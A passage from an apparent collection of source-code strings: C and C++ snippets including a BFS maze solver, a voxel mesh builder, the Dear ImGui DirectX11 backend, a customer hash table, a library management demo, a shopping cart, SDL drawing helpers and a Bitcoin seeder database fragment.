x \u5750\u6807\r\n                    int tempY = py[x][y];  // \u4fdd\u5b58\u4e0a\u4e00\u4e2a\u8282\u70b9\u7684 y \u5750\u6807\r\n                    x = tempX;  // \u66f4\u65b0\u5f53\u524d\u8282\u70b9\u7684 x \u5750\u6807\u4e3a\u4e0a\u4e00\u4e2a\u8282\u70b9\u7684 x \u5750\u6807\r\n                    y = tempY;  // \u66f4\u65b0\u5f53\u524d\u8282\u70b9\u7684 y \u5750\u6807\u4e3a\u4e0a\u4e00\u4e2a\u8282\u70b9\u7684 y \u5750\u6807\r\n                }\r\n                if (!isPath) {\r\n                    printf(\"0 \");  // \u53ef\u884c\u8def\u5f84\r\n                }\r\n            }\r\n        }\r\n        printf(\"\\n\");\r\n    }\r\n    printf(\"\\n\");\r\n}\r\n\r\nint main() {\r\n    printf(\"\u8ff7\u5bab:\\n\");\r\n    for (int i = 0; i < MAX; i++) {\r\n        for (int j = 0; j < MAX; j++) {\r\n            printf(\"%d \", maze[i][j]);\r\n        }\r\n        printf(\"\\n\");\r\n    }\r\n    printf(\"\\n\");\r\n\r\n    memset(vis, 0, sizeof(vis));\r\n    memset(px, -1, sizeof(px));\r\n    memset(py, -1, sizeof(py));\r\n\r\n    bfs(0, 0);\r\n    printf(\"\\n\");\r\n\r\n    PrintMaze();\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include \"subchunk_mesh.h\"\n#include <vector>\n#include \"block.h\"\n#include \"drawable_object.h\"\n#include \"glm/detail/type_vec.hpp\"\n#include \"texture.h\"\n\nstd::vector<int> createFaceVertices(Face face) {\n    if (face == px) return {1, 3, 5, 7};\n    if (face == nx) return {0, 2, 4, 6};\n    if (face == py) return {4, 5, 6, 7};\n    if (face == ny) return {0, 1, 2, 3};\n    if (face == pz) return {2, 3, 6, 7};\n    if (face == nz) return {0, 1, 4, 5};\n    throw std::exception(\"error in create Face indices\");\n}\n\nBlockPos getFaceNormal(Face face) {\n    if (face == px) return {1, 0, 0};\n    if (face == nx) return {-1, 0, 0};\n    if (face == py) return {0, 1, 0};\n    if (face == ny) return {0, -1, 0};\n    if (face == pz) return {0, 0, 1};\n    if (face == nz) return {0, 0, -1};\n    throw std::exception(\"error in create Face indices\");\n}\n\nstruct FacePointList {\n    GLuint p1, p2, p3, p4, p5, p6;\n};\n\nvoid SubChunkMesh::AddFace(const BlockFaceInfo &face) {\n    auto pos = face.pos;\n    auto idx = pos.y * 256 + pos.z * 16 + pos.x;\n    this->blocks_[idx][face.face] = face;\n}\n\nvoid SubChunkMesh::buildData() {\n    std::unordered_map<GLuint, std::vector<FacePointList>> temp_textures_ids_;\n    for (auto &block : this->blocks_) {  // \u904d\u5386\u6bcf\u4e00\u4e2a\u9762\n        for (auto block_face : block.second) {\n            auto face = static_cast<Face>(block_face.first);\n            auto face_info = block_face.second;\n            auto vs = createFaceVertices(face);\n            auto normal = getFaceNormal(face);\n            // 4\u4e2a\u9876\u70b9\n            for (int i = 0; i < vs.size(); i++) {\n                auto U = 0.0f, V = 0.0f;\n                if (i == 1) V = 1.0f;\n                if (i == 2) U = 1.0f;\n                if (i == 3) {\n                    U = 1.0f, V = 1.0f;\n                }\n                auto vi = vs[i];\n                auto dx = static_cast<GLfloat>(vi % 2);\n                auto dy = static_cast<GLfloat>(vi >= 4 ? 1 : 0);\n                auto dz = static_cast<GLfloat>((vi % 4) >= 2 ? 1 : 0);\n                VertexAttribute va{static_cast<GLfloat>(face_info.pos.x + dx),\n                                   static_cast<GLfloat>(face_info.pos.y + dy),\n                                   static_cast<GLfloat>(face_info.pos.z + dz),\n                                   1.0f,\n                                   0.35f,\n                                   0.21f,\n\n                                   U,\n                                   V,\n                                   (float)normal.x,\n                                   (float)normal.y,\n                                   (float)normal.z};\n                this->vertices_.push_back(va);\n            }\n            auto size = (GLuint)vertices_.size();\n            FacePointList list{size - 4u, size - 3u, size - 2u, size - 3u, size - 2u, size - 1u};\n            temp_textures_ids_[TexturePool::instance().getTextureID(block_face.second.type, block_face.second.face)]\n                .push_back(list);\n        }\n    }\n\n    // \u751f\u6210Indices\n    for (auto &kv : temp_textures_ids_) {\n        // \u9876\u70b9\u6570\u91cf\uff0c\u504f\u79fb\u91cf\n        this->texture_mappings_[kv.first] = {6 * kv.second.size(), this->indices_.size()};\n        for (auto face : kv.second) {\n            indices_.push_back(face.p1);\n            indices_.push_back(face.p2);\n            indices_.push_back(face.p3);\n            indices_.push_back(face.p4);\n            indices_.push_back(face.p5);\n            indices_.push_back(face.p6);\n        }\n    }\n};\n\nvoid SubChunkMesh::sendData() {\n    if (this->indices_.empty()) return;\n    glGenVertexArrays(1, &this->VAO);\n    // \u7ed1\u5b9a\u5f53\u524d\u5bf9\u8c61\n    glBindVertexArray(this->VAO);\n    // \u521b\u5efa\u7f13\u51b2\u533a\n    unsigned int VBO, EBO;\n    glGenBuffers(1, &VBO);\n    glGenBuffers(1, &EBO);\n    // \u53d1\u9001\u9876\u70b9\u6570\u636e\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glBufferData(GL_ARRAY_BUFFER, (GLuint)(vertices_.size() * sizeof(VertexAttribute)), vertices_.data(),\n                 GL_STATIC_DRAW);\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, (GLuint)(sizeof(GLuint) * indices_.size()), indices_.data(), GL_STATIC_DRAW);\n\n    // \u8bbe\u7f6e\u6570\u636e\u683c\u5f0f\n    // \u9876\u70b9\u4f4d\u7f6e\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, sizeof(VertexAttribute), (void *)(0 * sizeof(float)));\n    glEnableVertexAttribArray(0);\n    // \u9876\u70b9\u989c\u8272\n    glVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, sizeof(VertexAttribute), (void *)(3 * sizeof(float)));\n    glEnableVertexAttribArray(1);\n    // \u9876\u70b9\u7eb9\u7406\n    glVertexAttribPointer(2, 2, GL_FLOAT, GL_FALSE, sizeof(VertexAttribute), (void *)(6 * sizeof(float)));\n    glEnableVertexAttribArray(2);\n    // \u9876\u70b9\u6cd5\u7ebf\n    glVertexAttribPointer(3, 3, GL_FLOAT, GL_FALSE, sizeof(VertexAttribute), (void *)(8 * sizeof(float)));\n    glEnableVertexAttribArray(3);\n    // \u53d6\u6d88\u7ed1\u5b9a\u7f13\u51b2\u533a\u548c\u5f53\u524d\u5bf9\u8c61\n    glBindBuffer(GL_ARRAY_BUFFER, 0);\n    glBindVertexArray(0);\n}\n\nvoid SubChunkMesh::draw() {\n    if (this->VAO == 0) return;\n    glBindVertexArray(this->VAO);\n    for (auto &kv : this->texture_mappings_) {\n        glBindTexture(GL_TEXTURE_2D, kv.first);\n        glDrawElements(GL_TRIANGLES, (GLuint)kv.sec",
    "// dear imgui: Renderer Backend for DirectX11\n// This needs to be used along with a Platform Backend (e.g. Win32)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'ID3D11ShaderResourceView*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Support for large meshes (64k+ vertices) with 16-bit indices.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-05-19: DirectX11: Replaced direct access to ImDrawCmd::TextureId with a call to ImDrawCmd::GetTexID(). (will become a requirement)\n//  2021-02-18: DirectX11: Change blending equation to preserve alpha in output buffer.\n//  2019-08-01: DirectX11: Fixed code querying the Geometry Shader state (would generally error with Debug layer enabled).\n//  2019-07-21: DirectX11: Backup, clear and restore Geometry Shader is any is bound when calling ImGui_ImplDX10_RenderDrawData. Clearing Hull/Domain/Compute shaders without backup/restore.\n//  2019-05-29: DirectX11: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2019-04-30: DirectX11: Added support for special ImDrawCallback_ResetRenderState callback to reset render state.\n//  2018-12-03: Misc: Added #pragma comment statement to automatically link with d3dcompiler.lib when using D3DCompile().\n//  2018-11-30: Misc: Setting up io.BackendRendererName so it can be displayed in the About Window.\n//  2018-08-01: DirectX11: Querying for IDXGIFactory instead of IDXGIFactory1 to increase compatibility.\n//  2018-07-13: DirectX11: Fixed unreleased resources in Init and Shutdown functions.\n//  2018-06-08: Misc: Extracted imgui_impl_dx11.cpp/.h away from the old combined DX11+Win32 example.\n//  2018-06-08: DirectX11: Use draw_data->DisplayPos and draw_data->DisplaySize to setup projection matrix and clipping rectangle.\n//  2018-02-16: Misc: Obsoleted the io.RenderDrawListsFn callback and exposed ImGui_ImplDX11_RenderDrawData() in the .h file so you can call it yourself.\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n//  2016-05-07: DirectX11: Disabling depth-write.\n\n#include \"imgui.h\"\n#include \"imgui_impl_dx11.h\"\n\n// DirectX\n#include <stdio.h>\n#include <d3d11.h>\n#include <d3dcompiler.h>\n#ifdef _MSC_VER\n#pragma comment(lib, \"d3dcompiler\") // Automatically link with d3dcompiler.lib as we are using D3DCompile() below.\n#endif\n\n// DirectX11 data\nstruct ImGui_ImplDX11_Data\n{\n    ID3D11Device*               pd3dDevice;\n    ID3D11DeviceContext*        pd3dDeviceContext;\n    IDXGIFactory*               pFactory;\n    ID3D11Buffer*               pVB;\n    ID3D11Buffer*               pIB;\n    ID3D11VertexShader*         pVertexShader;\n    ID3D11InputLayout*          pInputLayout;\n    ID3D11Buffer*               pVertexConstantBuffer;\n    ID3D11PixelShader*          pPixelShader;\n    ID3D11SamplerState*         pFontSampler;\n    ID3D11ShaderResourceView*   pFontTextureView;\n    ID3D11RasterizerState*      pRasterizerState;\n    ID3D11BlendState*           pBlendState;\n    ID3D11DepthStencilState*    pDepthStencilState;\n    int                         VertexBufferSize;\n    int                         IndexBufferSize;\n\n    ImGui_ImplDX11_Data()       { memset(this, 0, sizeof(*this)); VertexBufferSize = 5000; IndexBufferSize = 10000; }\n};\n\nstruct VERTEX_CONSTANT_BUFFER\n{\n    float   mvp[4][4];\n};\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplDX11_Data* ImGui_ImplDX11_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplDX11_Data*)ImGui::GetIO().BackendRendererUserData : NULL;\n}\n\n// Functions\nstatic void ImGui_ImplDX11_SetupRenderState(ImDrawData* draw_data, ID3D11DeviceContext* ctx)\n{\n    ImGui_ImplDX11_Data* bd = ImGui_ImplDX11_GetBackendData();\n\n    // Setup viewport\n    D3D11_VIEWPORT vp;\n    memset(&vp, 0, sizeof(D3D11_VIEWPORT));\n    vp.Width = draw_data->DisplaySize.x;\n    vp.Height = draw_data->DisplaySize.y;\n    vp.MinDepth = 0.0f;\n    vp.MaxDepth = 1.0f;\n    vp.TopLeftX = vp.TopLeftY = 0;\n    ctx->RSSetViewports(1, &vp);\n\n    // Setup shader and vertex buffers\n    unsigned in",
    "//ikinci k\u0131s\u0131m \r\n#include<stdio.h>\r\n#include<stdlib.h>\r\n#include<string.h>\r\n#define tablo_boyutu adet\r\nint adet = 5;\r\ntypedef struct Liste {\r\n\tint index;\r\n\tint link;\r\n\tint musteri_numarasi;\r\n\tchar musteri_ad[100];\r\n\tchar musteri_soyad[100];\r\n} Row;\r\n\r\ntypedef struct tablo {\r\n\tRow satirlar[];\r\n} Tablo;\r\n\r\nTablo Tablolar;\r\n\r\nvoid initialize() { //Olu\u015fturulan listeye -1 de\u011ferlerini atad\u0131m\r\n\tfor(int i = 0; i < tablo_boyutu; i++){\r\n\t    Tablolar.satirlar[i].index = -1;\r\n\t\tTablolar.satirlar[i].musteri_numarasi = -1;\r\n\t\tTablolar.satirlar[i].link = -1;\r\n\t}\r\n}\r\n\r\nint hash(int numara){ //Mod \u0130\u015flemini yapt\u0131\u011f\u0131m fonksiyon\r\n\treturn (numara % tablo_boyutu);\r\n}\r\n\r\nvoid ekle(int musteri_numarasi, char * musteri_ad, char * musteri_soyad) { \r\n\tint adres = hash(musteri_numarasi), gecici = adres; //adres de\u011fi\u015fkenine m\u00fc\u015fteri numaras\u0131n\u0131n modunu al\u0131p atad\u0131m.\r\n\tif(Tablolar.satirlar[adres].index == -1){ //e\u011fer listedeki index bo\u015fsa(-1 ise) fonksiyona parametre olarak gelen de\u011ferleri atad\u0131m.\r\n\t\tTablolar.satirlar[adres].index=adres;\r\n\t\tTablolar.satirlar[adres].musteri_numarasi = musteri_numarasi;\r\n\t\tstrcpy(Tablolar.satirlar[adres].musteri_ad, musteri_ad);\r\n\t\tstrcpy(Tablolar.satirlar[adres].musteri_soyad, musteri_soyad);\r\n\t}\r\n\telse {\r\n\t\tint gecici_boyut = 0, gecici_boyut2 = 0;\r\n\t\tadres = 0;\r\n\t\twhile(gecici_boyut != tablo_boyutu){ //s\u0131r\u0131dan ba\u015flat\u0131p t\u00fcm listeyi gezen while d\u00f6ng\u00fcs\u00fc\r\n\t\t\tif(Tablolar.satirlar[adres].index == -1){ //0. indexteki bo\u015fsa parametre olarak gelenleri e\u015fitliyorum.\r\n\t\t\t\tTablolar.satirlar[adres].index = adres;\r\n\t\t\t\tTablolar.satirlar[adres].musteri_numarasi = musteri_numarasi;\r\n\t\t\t\tstrcpy(Tablolar.satirlar[adres].musteri_ad, musteri_ad);\r\n\t\t\t\tstrcpy(Tablolar.satirlar[adres].musteri_soyad, musteri_soyad);\r\n\t\t\t\tif(Tablolar.satirlar[gecici].link == -1){ //E\u011fer listenin linki bo\u015fsa gecicideki linke o an adresteki linki at\u0131yorum.\r\n\t\t\t\t\tTablolar.satirlar[gecici].link = Tablolar.satirlar[adres].index;\r\n\t\t\t\t\treturn;\r\n\t\t\t\t}\r\n\t\t\t\telse { \r\n\t\t\t\t\twhile(gecici_boyut2 != tablo_boyutu - 1){\r\n\t\t\t\t\t\tif(hash(Tablolar.satirlar[gecici_boyut2].musteri_numarasi) == gecici && Tablolar.satirlar[gecici_boyut2].link == -1){ //gecici olarak yeniden atad\u0131\u011f\u0131m 0 de\u011ferindeki m\u00fc\u015fteri numaras\u0131n\u0131 hash fonksiyonuna g\u00f6nderdim. d\u00f6nen de\u011fer ile o indexteki link bo\u015fsa ona ba\u011flad\u0131m.\r\n\t\t\t\t\t\t\tTablolar.satirlar[gecici_boyut2].link = Tablolar.satirlar[adres].index;\r\n\t\t\t\t\t\t\tprintf(\"Tum Musteriler Basariyla Eklendi!\\n\");\r\n\t\t\t\t\t\t\treturn;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tgecici_boyut2++;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tprintf(\"Hata Olustu! Musteri Eklenemedi!\\n\");\t\t\t\t\t\t\r\n\t\t\t\t}\t\t\t\t\r\n\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t\tadres++;\r\n\t\t\tgecici_boyut++;\r\n\t\t}\r\n\t\tprintf(\"Tablo Dolu!\\n\");\r\n\t\treturn;\r\n\t}\r\n}\r\n\r\nint ara(int musteri_numarasi){\r\n\tint adres = hash(musteri_numarasi), gecici = adres, sayac = 0;\r\n\tif(Tablolar.satirlar[adres].musteri_numarasi == musteri_numarasi){ //E\u011fer arad\u0131\u011f\u0131m\u0131z de\u011fer ilk listede yani direk bulabiliyorsak buras\u0131 \u00e7al\u0131\u015f\u0131yor.\r\n\t\tprintf(\"%d Numarali Musteri %d Adimda Bulundu!\\n\", musteri_numarasi, ++sayac);\r\n\t\treturn 0;\r\n\t}\r\n\telse {\t\r\n\t\tint gecici_boyut = 0;\r\n\t\twhile(gecici_boyut != tablo_boyutu){\r\n\t\t\tsayac++;\r\n\t\t\tif(Tablolar.satirlar[Tablolar.satirlar[adres].link].musteri_numarasi == musteri_numarasi){ //e\u011fer linke g\u00f6re arama yapmak gerekirse buras\u0131 \u00e7al\u0131\u015f\u0131yor. adresteki linke bak\u0131p gelen de\u011fer ayn\u0131 m\u0131 diye kontrol ediyor. de\u011filse di\u011fer adrese y\u00fckseltiyorum.\r\n\t\t\t\tprintf(\"%d Numarali Musteri %d Adimda Bulundu!\\n\", musteri_numarasi, sayac);\r\n\t\t\t\treturn 0;\r\n\t\t\t}\r\n\t\t\tif(hash(Tablolar.satirlar[gecici_boyut].musteri_numarasi) == gecici){ //linke g\u00f6re arama yapt\u0131\u011f\u0131m\u0131zda \u00f6nceki linki takip edebilmek i\u00e7in adresi g\u00fcncelliyorum.\r\n\t\t\t\tadres = gecici_boyut;\r\n\t\t\t}\r\n\t\t\tgecici_boyut++;\r\n\t\t}\r\n\t\tprintf(\"Aradiginiz Musteri Bulunamadi!\\n\");\r\n\t\treturn -1;\r\n\t}\r\n}\r\n\r\nvoid listele(){\r\n\tprintf(\"Index\\tNumara\\tAdi\\tSoyadi\\tLink\\n\");\r\n\tprintf(\"--------------------------------------\\n\");\r\n \tfor(int i = 0; i < tablo_boyutu; i++){\r\n\t\tprintf(\"%d \\t\", i);\r\n\t\tprintf(\"%d \\t\", Tablolar.satirlar[i].musteri_numarasi);\r\n\t\tprintf(\"%s \\t\", Tablolar.satirlar[i].musteri_ad);\r\n\t\tprintf(\"%s \\t\", Tablolar.satirlar[i].musteri_soyad);\r\n\t\tprintf(\"%d \\t\", Tablolar.satirlar[i].link); \t\t\t\r\n\t\tprintf(\"\\n\");\r\n\t}\r\n}\r\n\r\nint main(){\r\n\tprintf(\"Uygulama 2\\n\");\r\n\tprintf(\"Tablo Boyutu Giriniz: \");\r\n\tscanf(\"%d\", &adet);\r\n\ttablo_boyutu = adet;\r\n\tinitialize();\r\n\tekle(10, \"faruk\", \"ipek\");\r\n\tekle(13, \"tarik\", \"cakir\");\r\n\tekle(23, \"ahmet\", \"yilmaz\");\r\n\tekle(18, \"kemal\", \"demir\");\r\n\tekle(12, \"aa\",\"a\");\r\n\tekle(20,\"GF\",\"GG\");\r\n\tprintf(\"--------------------------------------\\n\");\r\n\tlistele();\r\n\tprintf(\"--------------------------------------\\n\");\r\n\tara(18);\r\n\tara(12);\r\n}\r\n",
    "#include \"storage_utils.hpp\"\n\n#include <string_view>\n\n\nnamespace cosmo::storage {\n    std::optional<fs::path> searchFile(const fs::directory_entry& directory, const std::string_view filename) {\n        for (const auto& entry : fs::directory_iterator(directory)) {\n            if (entry.is_regular_file()) {\n                std::string directory_file = entry.path().filename().string();\n                if (directory_file == filename) {\n                    return entry.path();\n                }\n            }\n        }\n        return std::nullopt;\n    }\n\n    std::vector<fs::path> seachFiles(const fs::directory_entry& directory, const std::string_view filename) {\n        std::vector<fs::path> files{};\n        for (const auto& entry : fs::directory_iterator(directory)) {\n            if (entry.is_regular_file()) {\n                std::string file = entry.path().filename().string();\n                if (file.rfind(filename, 0) == 0) {\n                    files.emplace_back(entry.path());\n                }\n            }\n        }\n\n        return files;\n    }\n}",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <map>\n\nusing namespace std;\n\n// Forward declaration\nclass User;\n\n// Class for Book\nclass Book {\npublic:\n    string title; // Made public\n    string author;\n    bool available;\n    int borrowCount;\n\n    Book(string _title, string _author) : title(_title), author(_author), available(true), borrowCount(0) {}\n\n    void displayDetails() {\n        cout << \"Title: \" << title << endl;\n        cout << \"Author: \" << author << endl;\n        cout << \"Availability: \" << (available ? \"Available\" : \"Not Available\") << endl;\n        cout << \"Times Borrowed: \" << borrowCount << endl;\n    }\n\n    void borrowBook(const User& user) {\n        if (available) {\n            available = false;\n            borrowCount++;\n            cout << \"Book \\\"\" << title << \"\\\" successfully borrowed by user with ID: \" << user.getID() << endl;\n        } else {\n            cout << \"Sorry, the book is not available for borrowing.\" << endl;\n        }\n    }\n\n    void renewBook() {\n        if (!available) {\n            cout << \"You have successfully renewed the book.\" << endl;\n        } else {\n            cout << \"Sorry, the book is not currently borrowed.\" << endl;\n        }\n    }\n\n    bool isAvailable() {\n        return available;\n    }\n\n    void makeAvailable() {\n        available = true;\n    }\n};\n\n// Class for User\nclass User {\nprivate:\n    string id;\n\npublic:\n    User(string _id) : id(_id) {}\n\n    string getID() const {\n        return id;\n    }\n};\n\n// Class for Library\nclass Library {\nprivate:\n    vector<Book> books;\n    string adminPassword;\n    map<string, User> users;\n\npublic:\n    Library(string _adminPassword) : adminPassword(_adminPassword) {}\n\n    void addUser(string id) {\n        users[id] = User(id);\n        cout << \"User with ID: \" << id << \" added successfully.\" << endl;\n    }\n\n    void addBook(string title, string author, string password) {\n        if (password != adminPassword) {\n            cout << \"Sorry, you don't have permission to add books.\" << endl;\n            return;\n        }\n        books.push_back(Book(title, author));\n        cout << \"Book added successfully.\" << endl;\n        displayBooks();\n    }\n\n    void displayBooks() {\n        cout << \"\\nAvailable Books:\" << endl;\n        for (const auto& book : books) {\n            if (book.isAvailable()) {\n                cout << \"Title: \" << book.title << \", Author: \" << book.author << endl;\n            }\n        }\n    }\n\n    void searchBook(string title) {\n        bool found = false;\n        for (const auto& book : books) {\n            if (book.isAvailable() && book.title == title) {\n                book.displayDetails();\n                found = true;\n                break;\n            }\n        }\n        if (!found) {\n            cout << \"Book not found or not available.\" << endl;\n        }\n    }\n\n    void borrowBook(string title, const User& user) {\n        for (auto& book : books) {\n            if (book.title == title) {\n                book.borrowBook(user);\n                return;\n            }\n        }\n        cout << \"Book not found.\" << endl;\n    }\n\n    void renewBook(string title) {\n        for (auto& book : books) {\n            if (!book.isAvailable() && book.title == title) {\n                book.renewBook();\n                return;\n            }\n        }\n        cout << \"Book not found or not currently borrowed.\" << endl;\n    }\n};\n\nint main() {\n    Library library(\"admin123\");\n\n    // Adding some initial books\n    library.addBook(\"The Great Gatsby\", \"F. Scott Fitzgerald\", \"admin123\");\n    library.addBook(\"To Kill a Mockingbird\", \"Harper Lee\", \"admin123\");\n    library.addBook(\"1984\", \"George Orwell\", \"admin123\");\n\n    // Adding some initial users\n    library.addUser(\"user1\");\n    library.addUser(\"user2\");\n    library.addUser(\"user3\");\n\n    int choice;\n    string title, password, userId;\n\n    do {\n        cout << \"\\nLibrary Management System\\n\";\n        cout << \"1. Search Book\\n\";\n        cout << \"2. Borrow Book\\n\";\n        cout << \"3. Renew Book\\n\";\n        cout << \"4. Add Book (Admin Only)\\n\";\n        cout << \"5. Add User\\n\";\n        cout << \"6. Exit\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1:\n                cout << \"Enter book title: \";\n                cin.ignore();\n                getline(cin, title);\n                library.searchBook(title);\n                break;\n            case 2:\n                cout << \"Enter user ID: \";\n                cin >> userId;\n                cout << \"Enter book title: \";\n                cin.ignore();\n                getline(cin, title);\n                library.borrowBook(title, library.users[userId]);\n                break;\n            case 3:\n                cout << \"Enter book title: \";\n                cin.ignore();\n                getline(cin, title);\n                library.renewBook(title);\n                break;\n            case 4:\n                cout << \"Enter admin password: \";\n           ",
    "#include \"ShoppingCart.h\"\n#include <iostream>\nusing namespace std;\n\nShoppingCart::ShoppingCart() : customerName(\"none\"), currentDate(\"January 1, 2016\") {}\n\nShoppingCart::ShoppingCart(const string& name, const string& date) : customerName(name), currentDate(date) {}\n\nstring ShoppingCart::GetCustomerName() const {\n    return customerName;\n}\n\nstring ShoppingCart::GetDate() const {\n    return currentDate;\n}\n\nvoid ShoppingCart::AddItem(const ItemToPurchase& item) {\n    cartItems.push_back(item);\n}\n\nvoid ShoppingCart::RemoveItem(const string& itemName) {\n    for (auto it = cartItems.begin(); it != cartItems.end(); ++it) {\n        if (it->GetName() == itemName) {\n            cartItems.erase(it);\n            return;\n        }\n    }\n    cout << \"Item not found in cart. Nothing removed.\" << endl;\n}\n\nvoid ShoppingCart::ModifyItem(const ItemToPurchase& item) {\n    bool found = false;\n    for (auto& cartItem : cartItems) {\n        if (cartItem.GetName() == item.GetName()) {\n            found = true;\n            if (item.GetDescription() != \"none\") cartItem.SetDescription(item.GetDescription());\n            if (item.GetPrice() != 0) cartItem.SetPrice(item.GetPrice());\n            if (item.GetQuantity() != 0) cartItem.SetQuantity(item.GetQuantity());\n        }\n    }\n    if (!found) {\n        cout << \"Item not found in cart. Nothing modified.\" << endl;\n    }\n}\n\nint ShoppingCart::GetNumItemsInCart() const {\n    int totalQuantity = 0;\n    for (const auto& item : cartItems) {\n        totalQuantity += item.GetQuantity();\n    }\n    return totalQuantity;\n}\n\ndouble ShoppingCart::GetCostOfCart() const {\n    double totalCost = 0;\n    for (const auto& item : cartItems) {\n        totalCost += item.GetQuantity() * item.GetPrice();\n    }\n    return totalCost;\n}\n\nvoid ShoppingCart::PrintTotal() const {\n    cout << customerName << \"'s Shopping Cart - \" << currentDate << endl;\n    cout << \"Number of Items: \" << GetNumItemsInCart() << endl << endl;\n\n    if (cartItems.empty()) {\n        cout << \"SHOPPING CART IS EMPTY\" << endl;\n    } else {\n        for (const auto& item : cartItems) {\n            item.PrintItemCost();\n        }\n    }\n\n    cout << \"\\nTotal: $\" << GetCostOfCart() << endl;  \n} \n\nvoid ShoppingCart::PrintDescriptions() const {\n    cout << customerName << \"'s Shopping Cart - \" << currentDate << endl;\n    cout << \"\\nItem Descriptions\" << endl;\n\n    if (cartItems.empty()) {\n        cout << \"SHOPPING CART IS EMPTY\" << endl;\n    } else {\n        for (const auto& item : cartItems) {\n            item.PrintItemDescription();\n        }\n    }\n}\n\n",
    "#include \"win.hpp\"\n\nnamespace sdl {\n\nWindow::Window(std::string title, Point2D pos, int w, int h) {\n    win = SDL_CreateWindow(title.c_str(), pos.get_x(), pos.get_y(),\n                            w, h, SDL_WINDOW_OPENGL);\n    ren = SDL_CreateRenderer(win, -1, 0);\n\n    SDL_SetRenderDrawColor(ren, 255, 255, 255, SDL_ALPHA_OPAQUE);\n    SDL_RenderClear(ren);\n}\n\nUint32 Window::get_window_id() const {\n    return SDL_GetWindowID(win);\n}\n\nvoid Window::present() {\n    SDL_RenderPresent(ren);\n}\n\nvoid Window::destroy_window() {\n    SDL_DestroyWindow(win);\n    SDL_DestroyRenderer(ren);\n}\n\nvoid Window::draw_lines(const std::vector<Point2D> points, int offset_x, int offset_y, int r, int g, int b) {\n    SDL_SetRenderDrawColor(ren, r, g, b, SDL_ALPHA_OPAQUE);\n\n    if (points.size() < 2) {\n        throw \"not enough points to draw lines\";\n    }\n\n    for (size_t i = 0; i < points.size() - 1; ++i) {\n        const Point2D start = points[i];\n        const Point2D end = points[i + 1];\n        SDL_RenderDrawLine(ren, start.get_x() + offset_x, start.get_y() + offset_y, end.get_x() + offset_x, end.get_y() + offset_y);\n    }\n}\n\nbool Window::is_in_polygon(const std::vector<Point2D> unique_vertices, int x, int y) {\n    unsigned int j = unique_vertices.size() - 1;\n    int num_of_intersections = 0;\n\n    for (unsigned int i = 0; i < unique_vertices.size(); i++) {\n        const Point2D vertex_i = unique_vertices[i];\n        const Point2D vertex_j = unique_vertices[j];\n\n        if ((vertex_i.get_y() < y && vertex_j.get_y() >= y) ||\n            (vertex_j.get_y() < y && vertex_i.get_y() >= y)) {\n\n            if (x < (float(y - vertex_i.get_y()) * (vertex_j.get_x() - vertex_i.get_x()) /\n                     (vertex_j.get_y() - vertex_i.get_y())) + vertex_i.get_x()) {\n\n                num_of_intersections++;\n            }\n        }\n        j = i;\n    }\n    return (num_of_intersections % 2 != 0);\n}\n\nvoid Window::fill(const std::vector<Point2D> vertices, int offset_x, int offset_y, int r, int g, int b) {\n    if (vertices.size() < 4) {\n        throw (\"Invalid polygon: Less than 4 vertices\");\n    }\n\n    // Character is always in the range of [0, 100]\n    const int minX = 0;\n    const int minY = 0;\n    const int maxX = 100;\n    const int maxY = 100;\n\n    // Remove last duplicate vertex of polygon\n    std::vector<Point2D> unique_vertices(vertices.begin(), vertices.end() - 1);\n\n    SDL_SetRenderDrawColor(ren, r, g, b, SDL_ALPHA_OPAQUE);\n\n    for (int i = minX; i <= maxX; i++) {\n        for (int j = minY; j <= maxY; j++) {\n            if (is_in_polygon(unique_vertices, i, j)) {\n                SDL_RenderDrawPoint(ren, i + offset_x, j + offset_y);\n            }\n        }\n    }\n}\n\n\n} // namespace sdl",
    "#include \"db.h\"\n#include <stdlib.h>\n\nusing namespace std;\n\nint nMinimumHeight = 0;\n\nvoid CAddrInfo::Update(bool good) {\n  uint32_t now = time(NULL);\n  if (ourLastTry == 0)\n    ourLastTry = now - MIN_RETRY;\n  int age = now - ourLastTry;\n  lastTry = now;\n  ourLastTry = now;\n  total++;\n  if (good)\n  {\n    success++;\n    ourLastSuccess = now;\n  }\n  stat2H.Update(good, age, 3600*2);\n  stat8H.Update(good, age, 3600*8);\n  stat1D.Update(good, age, 3600*24);\n  stat1W.Update(good, age, 3600*24*7);\n  stat1M.Update(good, age, 3600*24*30);\n  int ign = GetIgnoreTime();\n  if (ign && (ignoreTill==0 || ignoreTill < ign+now)) ignoreTill = ign+now;\n//  printf(\"%s: got %s result: success=%i/%i; 2H:%.2f%%-%.2f%%(%.2f) 8H:%.2f%%-%.2f%%(%.2f) 1D:%.2f%%-%.2f%%(%.2f) 1W:%.2f%%-%.2f%%(%.2f) \\n\", ToString(ip).c_str(), good ? \"good\" : \"bad\", success, total, \n//  100.0 * stat2H.reliability, 100.0 * (stat2H.reliability + 1.0 - stat2H.weight), 